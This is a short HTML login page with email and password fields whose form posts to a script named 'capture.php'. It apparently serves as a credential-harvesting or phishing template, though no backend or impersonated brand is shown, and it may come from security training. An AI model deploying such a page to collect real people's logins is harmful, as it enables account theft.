<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="login-container">
        <h1>Login to your account</h1>
        <form action="./capture.php" method="POST">
            <div class="form-group">
                <label for="email">Email or Mobile Number<span>*</span></label>
                <input type="text" id="email" name="email" placeholder="Email or Mobile Number" required>
            </div>
            <div class="form-group">
                <label for="password">Password<span>*</span></label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-button">LOGIN</button>
        </form>
        <div class="links">
            <p>Forgot your password? <a href="#">Reset here</a></p>
            <p>Have trouble logging in? <a href="#">Get Help</a></p>
        </div>
    </div>
</body>
</html>
